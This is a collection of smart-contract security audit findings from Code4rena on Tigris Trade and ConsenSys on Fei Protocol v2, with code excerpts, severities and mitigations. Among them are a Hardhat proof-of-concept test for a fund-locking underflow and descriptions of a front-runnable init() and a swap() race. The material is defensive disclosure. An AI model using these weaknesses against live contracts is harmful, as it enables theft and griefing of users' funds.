      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105>\n\n### Impact\n\nThe `Lock` contract (<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10>) allows end-users to interact with bonds.\n\nThere are two functions that allow to lock some amount of assets. The first function is `Lock.lock` (<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76>) which creates a new bond. The second function is `Lock.extendLock` (<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92>). This function extends the lock for some `_period` and / or increases the locked amount by some `_amount`.\n\nThe issue is that the `Lock.extendLock` function does not increase the value in `totalLocked[_asset]`. This however is necessary because `totalLocked[_asset]` is reduced when `Lock.release` (<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105>) is called.\n\nTherefore only the amount of assets deposited via `Lock.lock` can be released again. The amount of assets deposited using `Lock.extendLock` can never be released again because reducing `totalLocked[_asset]` will cause a revert due to underflow.\n\nSo the amount of assets deposited using `Lock.extendLock` is lost.\n\n### Proof of Concept\n\n1.  User A calls `Lock.lock` to lock a certain `_amount` (amount1) of `_asset` for a certain `_period`.\n2.  User A calls then `Lock.extendLock` and increases the locked amount of the bond by some amount2\n3.  User A waits until the bond has expired\n4.  User A calls `Lock.release`. This function calculates `totalLocked[asset] -= lockAmount;`. Which will cause a revert because the value of `totalLocked[asset]` is only amount1\n\nYou can add the following test to the `Bonds` test in `Bonds.js`:\n\n```javascript\ndescribe(\"ReleaseUnderflow\", function () {\n    it(\"release can cause underflow\", async function () {\n        await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther(\"110\"));\n        // Lock 100 for 9 days\n        await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther(\"100\"), 9);\n\n        await bond.connect(owner).setManager(lock.address);\n\n        await stabletoken.connect(user).approve(lock.address, ethers.utils.parseEther(\"10\"));\n\n        // Lock another 10\n        await lock.connect(user).extendLock(1, ethers.utils.parseEther(\"10\"), 0);\n\n        await network.provider.send(\"evm_increaseTime\", [864000]); // Skip 10 days\n        await network.provider.send(\"evm_mine\");\n\n        // Try to release 110 after bond has expired -> Underflow\n        await lock.connect(user).release(1);\n    });\n});\n```\n\nRun it with `npx hardhat test --grep \"release can cause underflow\"`.\\\nYou can see that it fails because it causes an underflow.\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nAdd `totalLocked[_asset] += amount` to the `Lock.extendLock` function.\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/23)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/23#issuecomment-1383078283):**\n > The warden has shown an issue with accounting that will cause principal deposits added via `extendLock` to be lost, for this reason I agree with High Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/23#issuecomment-1407130352):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419172200\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `Lock` contract in the code-423n4/2022-12-tigris repository which allows end-users to interact with bonds. There are two functions that allow to lock some amount of assets. The first function is `Lock.lock` which creates a new bond and the second function is `Lock.extendLock` which extends the lock for some `_period` and / or increases the locked amount by some `_amount`. \n\nThe issue is that the `Lock.extendLock` function does not increase the value in `totalLocked[_asset]`. This however is necessary because `totalLocked[_asset]` is reduced when `Lock.release` is called. Therefore only the amount of assets deposited via `Lock.lock` can be released again. The amount of assets deposited using `Lock.extendLock` can never be released again because reducing `totalLocked[_asset]` will cause a revert due to underflow, causing the assets to be lost.\n\nThe recommended mitigation step is to add `totalLocked[_asset] += amount` to the `Lock.extendLock` function. This bug can be tested using the code provided in the report and running it with npx hardhat test --grep \"release can cause underflow\".",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/23",
      "tags": [],
      "finders": [
        "csanuragjain",
        "HollaDieWaldfee",
        "sha256yan",
        "kaliberpoziomka8552",
        "cccz",
        "0xbepresent",
        "Ruhum",
        "0xsomeone",
        "rvierdiiev",
        "ali_shehab"
      ]
    },
    {
      "id": "13311",
      "title": "CollateralizationOracle - misleading comments",
      "impact": "LOW",
      "content": "#### Description\n\n\nAccording to an inline comment in `isOvercollateralized`, the validity status of `pcvStats` is ignored, while it is actually being checked.\n\n\nSimilarly, a comment in `pcvStats` mentions that the returned `protocolEquity` is 0 if there is less PCV than circulating FEI, while in reality, `pcvStats` always returns the difference between the former and the latter, even if it is negative.\n\n\n#### Examples\n\n\n**code/contracts/oracle/CollateralizationOracle.sol:L332-L339**\n\n\n\n```\n/// Controlled Value) than the circulating (user-owned) FEI, i.e.\n/// a positive Protocol Equity.\n/// Note: the validity status is ignored in this function.\nfunction isOvercollateralized() external override view whenNotPaused returns (bool) {\n    (,, int256 \\_protocolEquity, bool \\_valid) = pcvStats();\n    require(\\_valid, \"CollateralizationOracle: reading is invalid\");\n    return \\_protocolEquity > 0;\n}\n\n```\n**code/contracts/oracle/CollateralizationOracle.sol:L283-L284**\n\n\n\n```\n/// @return protocolEquity : the difference between PCV and user circulating FEI.\n/// If there are more circulating FEI than $ in the PCV, equity is 0.\n\n```\n**code/contracts/oracle/CollateralizationOracle.sol:L327**\n\n\n\n```\nprotocolEquity = int256(protocolControlledValue) - int256(userCirculatingFei);\n\n```\n#### Recommendation\n\n\nRevise the comments.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13310",
      "title": "CollateralizationOracle - swapDeposit should call internal functions to remove/add deposits",
      "impact": "LOW",
      "content": "#### Description\n\n\nInstead of calling `removeDeposit` and `addDeposit`, `swapDeposit` should call its internal sister functions `_removeDeposit` and `_addDeposit` to avoid running the `onlyGovernor` checks multiple times.\n\n\n#### Examples\n\n\n**code/contracts/oracle/CollateralizationOracle.sol:L191-L198**\n\n\n\n```\n/// @notice Swap a PCVDeposit with a new one, for instance when a new version\n/// of a deposit (holding the same token) is deployed.\n/// @param \\_oldDeposit : the PCVDeposit to remove from the list.\n/// @param \\_newDeposit : the PCVDeposit to add to the list.\nfunction swapDeposit(address \\_oldDeposit, address \\_newDeposit) external onlyGovernor {\n    removeDeposit(\\_oldDeposit);\n    addDeposit(\\_newDeposit);\n}\n\n```\n#### Recommendation\n\n\nCall the internal functions instead. `addDeposit`’s and `removeDeposit`’s visibility can then be changed from `public` to `external`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13309",
      "title": "FeiTimedMinter - constructor does not enforce the same boundaries as setter for frequency",
      "impact": "LOW",
      "content": "#### Description\n\n\nThe setter method for `frequency` enforced upper and lower bounds while the constructor does not. Users cannot trust that the `frequency` is actually set to be within bounds on deployment.\n\n\n#### Examples\n\n\n**code/contracts/token/FeiTimedMinter.sol:L32-L48**\n\n\n\n```\nconstructor(\n    address \\_core,\n    address \\_target,\n    uint256 \\_incentive,\n    uint256 \\_frequency,\n    uint256 \\_initialMintAmount\n)\n    CoreRef(\\_core)\n    Timed(\\_frequency)\n    Incentivized(\\_incentive)\n    RateLimitedMinter((\\_initialMintAmount + \\_incentive) / \\_frequency, (\\_initialMintAmount + \\_incentive), true)\n{\n    \\_initTimed();\n\n    \\_setTarget(\\_target);\n    \\_setMintAmount(\\_initialMintAmount);\n}\n\n```\n**code/contracts/token/FeiTimedMinter.sol:L82-L87**\n\n\n\n```\nfunction setFrequency(uint256 newFrequency) external override onlyGovernorOrAdmin {\n    require(newFrequency >= MIN\\_MINT\\_FREQUENCY, \"FeiTimedMinter: frequency low\");\n    require(newFrequency <= MAX\\_MINT\\_FREQUENCY, \"FeiTimedMinter: frequency high\");\n\n    \\_setDuration(newFrequency);\n}\n\n```\n#### Recommendation\n\n\nPerform the same checks on `frequency` in the constructor as in the `setFrequency` method.\n\n\nThis contract is also inherited by a range of contracts that might specify different boundaries to what is hardcoded in the `FeiTimedMinter`. A way to enforce bounds-checks could be to allow overriding the setter method and using the setter in the constructor as well ensuring that bounds are also checked on deployment.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13308",
      "title": "CollateralizationOracle - potentially unsafe casts",
      "impact": "LOW",
      "content": "#### Description\n\n\n`protocolControlledValue` is the cumulative USD token value of all tokens in the PCV. The USD value is determined using external chainlink oracles. To mitigate some effects of attacks on chainlink to propagate to this protocol it is recommended to implement a defensive approach to handling values derived from the external source. Arithm. overflows are checked by the compiler (`0.8.4`), however, it does not guarantee safe casting from unsigned to signed integer. The scenario of this happening might be rather unlikely, however, there is no guarantee that the external price-feed is not taken over by malicious actors and this is when every line of defense counts.\n\n\n\n```\n//solidity 0.8.7\n »  int(uint(2\\*\\*255))\n-57896044618658097711785492504343953926634992332820282019728792003956564819968\n »  int(uint(2\\*\\*255-2))\n57896044618658097711785492504343953926634992332820282019728792003956564819966\n\n```\n#### Examples\n\n\n**code/contracts/oracle/CollateralizationOracle.sol:L327-L327**\n\n\n\n```\nprotocolEquity = int256(protocolControlledValue) - int256(userCirculatingFei);\n\n```\n**code/contracts/oracle/CollateralizationOracle.sol:L322-L322**\n\n\n\n```\nprotocolControlledValue += \\_oraclePrice.mul(\\_totalTokenBalance).asUint256();\n\n```\n#### Recommendation\n\n\nPerform overflow checked SafeCast as another line of defense against oracle manipulation.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13307",
      "title": "BalancerLBPSwapper - tokenSpent and tokenReceived should be immutable",
      "impact": "LOW",
      "content": "#### Description\n\n\nAcc. to the inline comment both `tokenSpent` and `tokenReceived` should be immutable but they are not declared as such.\n\n\n#### Examples\n\n\n**code/contracts/pcv/balancer/BalancerLBPSwapper.sol:L92-L94**\n\n\n\n```\n// tokenSpent and tokenReceived are immutable\ntokenSpent = \\_tokenSpent;\ntokenReceived = \\_tokenReceived;\n\n```\n**code/contracts/pcv/balancer/BalancerLBPSwapper.sol:L40-L44**\n\n\n\n```\n/// @notice the token to be auctioned\naddress public override tokenSpent;\n\n/// @notice the token to buy\naddress public override tokenReceived;\n\n```\n#### Recommendation\n\n\nDeclare both variable `immutable`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13306",
      "title": "StableSwapOperatorV1 - the contract relies on the 1$ price of every token in 3pool",
      "impact": "LOW",
      "content": "#### Description\n\n\nTo evaluate the price of the 3pool lp token, the built-in `get_virtual_price` function is used. This function is supposed to be a manipulation-resistant pricing function that works under the assumption that all the tokens in the pool are worth 1$. If one of the tokens is broken and is priced less, the price is harder to calculate. For example, Chainlink uses the following function to calculate at least the lower boundary of the lp price:\n<https://blog.chain.link/using-chainlink-oracles-to-securely-utilize-curve-lp-pools/>\n\n\nThe withdrawal and the controlled value calculation are always made in DAI instead of other stablecoins of the 3pool. So if DAI gets compromised but other tokens aren’t, there is no way to switch to them.\n\n\n\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13305",
      "title": "RateLimited - Contract starts with a full buffer at deployment",
      "impact": "LOW",
      "content": "#### Description\n\n\nA contract that inherits from `RateLimited` starts out with a full buffer when it is deployed.\n\n\n**code/contracts/utils/RateLimited.sol:L35**\n\n\n\n```\n\\_bufferStored = \\_bufferCap;\n\n```\nThat means the full `bufferCap` is immediately available after deployment; it doesn’t have to be built up over time. This behavior might be unexpected.\n\n\n#### Recommendation\n\n\nWe recommend starting with an empty buffer, or – if there are valid reasons for the current implementation – at least document it clearly.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13304",
      "title": "CollateralizationOracle - missing events and incomplete event information",
      "impact": "LOW",
      "content": "#### Description\n\n\nThe `CollateralizationOracle.setDepositExclusion` function is used to exclude and re-include deposits from collateralization calculations. Unlike the other state-changing functions in this contract, it doesn’t emit an event to inform about the exclusion or re-inclusion.\n\n\n**code/contracts/oracle/CollateralizationOracle.sol:L111-L113**\n\n\n\n```\nfunction setDepositExclusion(address \\_deposit, bool \\_excluded) external onlyGuardianOrGovernor {\n    excludedDeposits[\\_deposit] = \\_excluded;\n}\n\n```\nThe `DepositAdd` event emits not only the deposit address but also the deposit’s token. Despite the symmetry, the `DepositRemove` event does not emit the token.\n\n\n**code/contracts/oracle/CollateralizationOracle.sol:L25-L26**\n\n\n\n```\nevent DepositAdd(address from, address indexed deposit, address indexed token);\nevent DepositRemove(address from, address indexed deposit);\n\n```\n#### Recommendation\n\n\n1. `setDepositInclusion` should emit an event that informs about the deposit and whether it was included or excluded.\n2. For symmetry reasons and because it is indeed useful information, the `DepositRemove` event could include the deposit’s token.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13303",
      "title": "ChainlinkOracleWrapper - latestRoundData might return stale results",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nThe oracle wrapper calls out to a chainlink oracle receiving the `latestRoundData()`. It then checks freshness by verifying that the answer is indeed for the last known round. The returned `updatedAt` timestamp is not checked.\n\n\nIf there is a problem with chainlink starting a new round and finding consensus on the new value for the oracle (e.g. chainlink nodes abandon the oracle, chain congestion, vulnerability/attacks on the chainlink system) consumers of this contract may continue using outdated stale data (if oracles are unable to submit no new round is started)\n\n\n#### Examples\n\n\n**code/contracts/oracle/ChainlinkOracleWrapper.sol:L49-L58**\n\n\n\n```\n/// @notice read the oracle price\n/// @return oracle price\n/// @return true if price is valid\nfunction read() external view override returns (Decimal.D256 memory, bool) {\n    (uint80 roundId, int256 price,,, uint80 answeredInRound) = chainlinkOracle.latestRoundData();\n    bool valid = !paused() && price > 0 && answeredInRound == roundId;\n\n    Decimal.D256 memory value = Decimal.from(uint256(price)).div(oracleDecimalsNormalizer);\n    return (value, valid);\n}\n\n```\n**code/contracts/oracle/ChainlinkOracleWrapper.sol:L42-L47**\n\n\n\n```\n/// @notice determine if read value is stale\n/// @return true if read value is stale\nfunction isOutdated() external view override returns (bool) {\n    (uint80 roundId,,,, uint80 answeredInRound) = chainlinkOracle.latestRoundData();\n    return answeredInRound != roundId;\n}\n\n```\n#### Recommendation\n\n\nConsider checking the oracle responses `updatedAt` value after calling out to `chainlinkOracle.latestRoundData()` verifying that the result is within an allowed margin of freshness.",
      "summary": "\nThis bug report is about a problem with the oracle wrapper calls out to a chainlink oracle receiving the `latestRoundData()`. It checks freshness by verifying that the answer is indeed for the last known round, but the returned `updatedAt` timestamp is not checked. This means that if there is a problem with chainlink starting a new round and finding consensus on the new value for the oracle (e.g. chainlink nodes abandon the oracle, chain congestion, vulnerability/attacks on the chainlink system), consumers of this contract may continue using outdated stale data (if oracles are unable to submit no new round is started).\n\nThe report provides code snippets from the ChainlinkOracleWrapper.sol file, which shows the functions read() and isOutdated(). The read() function reads the oracle price and checks if it is valid, while the isOutdated() function determines if the read value is stale.\n\nThe recommendation is to consider checking the oracle responses `updatedAt` value after calling out to `chainlinkOracle.latestRoundData()` verifying that the result is within an allowed margin of freshness. This will ensure that the data used by the contract is up-to-date and accurate.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13302",
      "title": "CollateralizationOracleWrapper - the deviation threshold check in update() always returns false",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nA call to `update()` returns a boolean flag indicating whether the update was performed on outdated data. This flag is being checked in `updateIfOutdated()` which is typically called by an incentivized keeper function.\n\n\nThe `_isExceededDeviationThreshold` calls at the end of the `_update()` function always return `false` as they are comparing the same values (`cachedProtocolControlledValue` to the `_protocolControlledValue` value and `cachedProtocolControlledValue` has just been set to `_protocolControlledValue` a couple of lines before). `_isExceededDeviationThreshold` will, therefore, never detect a deviation and return `false´.\n\n\nThere may currently be no incentive (e.g. from the keeper side) to call `update()` if the values are not outdated but they deviated too much from the target. However, anyone can force an update by calling the non-incentivized public `update()` method instead.\n\n\n#### Examples\n\n\n**code/contracts/oracle/CollateralizationOracleWrapper.sol:L156-L177**\n\n\n\n```\n    require(\\_validityStatus, \"CollateralizationOracleWrapper: CollateralizationOracle is invalid\");\n\n    // set cache variables\n    cachedProtocolControlledValue = \\_protocolControlledValue;\n    cachedUserCirculatingFei = \\_userCirculatingFei;\n    cachedProtocolEquity = \\_protocolEquity;\n\n    // reset time\n    \\_initTimed();\n\n    // emit event\n    emit CachedValueUpdate(\n        msg.sender,\n        cachedProtocolControlledValue,\n        cachedUserCirculatingFei,\n        cachedProtocolEquity\n    );\n\n    return outdated\n        || \\_isExceededDeviationThreshold(cachedProtocolControlledValue, \\_protocolControlledValue)\n        || \\_isExceededDeviationThreshold(cachedUserCirculatingFei, \\_userCirculatingFei);\n}\n\n```\n#### Recommendation\n\n\n* Add unit tests to check for all three return conditions (timed, deviationA, deviationB)\n* Make sure to compare the current to the stored value before updating the cached values when calling `_isExceededDeviationThreshold`.",
      "summary": "\nThis bug report is about the `update()` function in the CollateralizationOracleWrapper.sol contract. The `update()` function returns a boolean flag indicating whether the update was performed on outdated data. This flag is then checked in the `updateIfOutdated()` function which is typically called by an incentivized keeper function. \n\nThe bug is that the `_isExceededDeviationThreshold` calls at the end of the `_update()` function always return `false` as they are comparing the same values (`cachedProtocolControlledValue` to the `_protocolControlledValue` value and `cachedProtocolControlledValue` has just been set to `_protocolControlledValue` a couple of lines before). This means that `_isExceededDeviationThreshold` will never detect a deviation and return `false`. This means that there may currently be no incentive for anyone to call `update()` if the values are not outdated but they deviated too much from the target. \n\nThe recommendation is to add unit tests to check for all three return conditions (timed, deviationA, deviationB), as well as to make sure to compare the current to the stored value before updating the cached values when calling `_isExceededDeviationThreshold`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13301",
      "title": "PCVEquityMinter and BalancerLBPSwapper - desynchronisation race",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nThere is nothing that prevents other actors from calling `BalancerLBPSwapper.swap()` `afterTime` but right before `PCVEquityMinter.mint()` would as long as the `minAmount` required for the call to pass is deposited to `BalancerLBPSwapper`.\n\n\nBoth the `PCVEquityMinter.mint()` and `BalancerLBPSwapper.swap()` are timed (via the `afterTime` modifier) and are ideally in sync. In an ideal world the incentive to call `mint()` would be enough to ensure that both contracts are always in sync, however, a malicious actor might interfere by calling `.swap()` directly, providing the `minAmount` required for the call to pass. This will have two effects:\n\n\n* instead of taking the newly minted FEI from `PCVEquityMinter`, existing FEI from the malicious user will be used with the pool. (instead of inflating the token the malicious actor basically pays for it)\n* the `Timed` modifiers of both contracts will be out of sync with `BalancerLBPSwapper.swap()` being reset (and failing until it becomes available again) and `PCVEquityMinter.mint()` still being available. Furthermore, keeper-scripts (or actors that want to get the incentive) might continue to attempt to `mint()` while the call will ultimately fail in `.swap()` due to the resynchronization of `timed` (unless they simulate the calls first).\n\n\nNote: There are not a lot of incentives to actually exploit this other than preventing protocol inflation (mint) and potentially griefing users. A malicious user will lose out on the incentivized call and has to ensure that the `minAmount` required for `.swap()` to work is available. It is, however, in the best interest of security to defuse the unpredictable racy character of the contract interaction.\n\n\n#### Examples\n\n\n**code/contracts/token/PCVEquityMinter.sol:L91-L93**\n\n\n\n```\nfunction \\_afterMint() internal override {\n    IPCVSwapper(target).swap();\n}\n\n```\n**code/contracts/pcv/balancer/BalancerLBPSwapper.sol:L172-L181**\n\n\n\n```\nfunction swap() external override afterTime whenNotPaused {\n    (\n        uint256 spentReserves,\n        uint256 receivedReserves, \n        uint256 lastChangeBlock\n    ) = getReserves();\n\n    // Ensures no actor can change the pool contents earlier in the block\n    require(lastChangeBlock < block.number, \"BalancerLBPSwapper: pool changed this block\");\n\n\n```\n#### Recommendation\n\n\nIf `BalancerLBPSwapper.swap()` is only to be called within the flows of action from a `PCVEquityMinter.mint()` it is suggested to authenticate the call and only let `PCVEquityMinter` call `.swap()`",
      "summary": "\nThis bug report describes a problem with two contracts, `PCVEquityMinter.mint()` and `BalancerLBPSwapper.swap()`, which are both timed (via the `afterTime` modifier) and are ideally in sync. The issue is that nothing prevents other actors from calling `BalancerLBPSwapper.swap()` `afterTime` but right before `PCVEquityMinter.mint()` as long as the `minAmount` required for the call to pass is deposited to `BalancerLBPSwapper`. This can have two effects: first, instead of taking the newly minted FEI from `PCVEquityMinter`, existing FEI from the malicious user will be used with the pool; second, the `Timed` modifiers of both contracts will be out of sync with `BalancerLBPSwapper.swap()` being reset and `PCVEquityMinter.mint()` still being available. \n\nThe recommendation is to authenticate the call and only let `PCVEquityMinter` call `.swap()` to prevent this issue. This will ensure that the contracts are always in sync and that malicious actors cannot exploit the system.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13300",
      "title": "BalancerLBPSwapper - init() can be front-run to potentially steal tokens",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nThe deployment process for `BalancerLBPSwapper` appears to be the following:\n\n\n1. deploy `BalancerLBPSwapper`.\n2. run `ILiquidityBootstrappingPoolFactory.create()` proving the newly deployed swapper address as the owner of the pool.\n3. initialize `BalancerLBPSwapper.init()` with the address of the newly created pool.\n\n\nThis process may be split across multiple transactions as in the `v2Phase1.js` deployment scenario.\n\n\nBetween step (1) and (3) there is a window of opportunity for someone to maliciously initialize contract. This should be easily detectable because calling `init()` twice should revert the second transaction. If this is not caught in the deployment script this may have more severe security implications. Otherwise, this window can be used to grief the deployment initializing it before the original initializer does forcing them to redeploy the contract or to steal any `tokenSpent`/`tokenReceived` that are owned by the contract at this time.\n\n\nNote: It is assumed that the contract will not own a lot of tokens right after deployment rendering the scenario of stealing tokens more unlikely. However, that highly depends on the deployment script for the contract system.\n\n\n#### Examples\n\n\n**code/contracts/pcv/balancer/BalancerLBPSwapper.sol:L107-L117**\n\n\n\n```\nfunction init(IWeightedPool \\_pool) external {\n    require(address(pool) == address(0), \"BalancerLBPSwapper: initialized\");\n\n    pool = \\_pool;\n    IVault \\_vault = \\_pool.getVault();\n\n    vault = \\_vault;\n\n    // Check ownership\n    require(\\_pool.getOwner() == address(this), \"BalancerLBPSwapper: contract not pool owner\");\n\n\n```\n**code/contracts/pcv/balancer/BalancerLBPSwapper.sol:L159-L160**\n\n\n\n```\nIERC20(tokenSpent).approve(address(\\_vault), type(uint256).max);\nIERC20(tokenReceived).approve(address(\\_vault), type(uint256).max);\n\n```\n#### Recommendation\n\n\nprotect `BalancerLBPSwapper.init()` and only allow a trusted entity (e.g. the initial deployer) to call this method.",
      "summary": "\nA bug has been identified in the deployment process of the BalancerLBPSwapper contract. This process involves deploying the contract, running the ILiquidityBootstrappingPoolFactory.create() method and initializing the BalancerLBPSwapper.init() method with the address of the newly created pool. There is a window of opportunity between steps 1 and 3 for someone to maliciously initialize the contract, potentially allowing them to redeploy the contract or steal any tokens that are owned by the contract at this time.\n\nIn order to prevent this bug, a recommendation is to protect the BalancerLBPSwapper.init() method and only allow a trusted entity, such as the initial deployer, to call it. This will help to ensure that malicious actors cannot take advantage of the window of opportunity between steps 1 and 3.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Fei Protocol v2 Phase 1",
      "source_link": "https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Bernhard Gomig\n",
        " Martin Ortner",
        " Eli Leers",
        " Heiko Fisch"
      ]
    },
    {
      "id": "13299",
      "title": "StableSwapOperatorV1 - FEI tokens in the contract are not considerred as protocol-owned",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nEvery `PCVDeposit` contract should return the amount of PCV controlled by this contract in the `resistantBalanceAndFei`. In addition to that, this function returns the amount of protocol-controlled FEI, which is not supposed to be collateralized. These values are crucial for evaluating the collateralization of the protocol.\n\n\nUnlike some other `PCVDeposit` contracts, protocol-controlled FEI is not minted during the deposit and not burnt during the withdrawal. These FEI tokens are transferred beforehand, so when depositing, all the FEI that are instantly becoming protocol-controlled and heavily impact the collateralization rate. The opposite impact, but as much significant, happens during the withdrawal.\n\n\nThe amount of FEI needed for the deposited is calculated dynamically, it is hard to predict the exact amount beforehand. There may be too many FEI tokens in the contract and the leftovers will be considered as the user-controlled FEI.\n\n\n#### Recommendation\n\n\nThere may be different approaches to solve this issue. One of them would be to make sure that the Fei transfers to/from the contract and the deposit/withdraw calls are happening in a single transaction. These FEI should be minted, burnt, or re-used as the protocol-controlled FEI in the same transaction. Another option would be to consider all the FEI balance in the contract as the protocol-controlled FEI.\n\n\nIf the intention is to have all these FEI collateralized, the other solution is needed: make sure that `resistantBalanceAndFei` always returns `resistantFei` equals zero.",
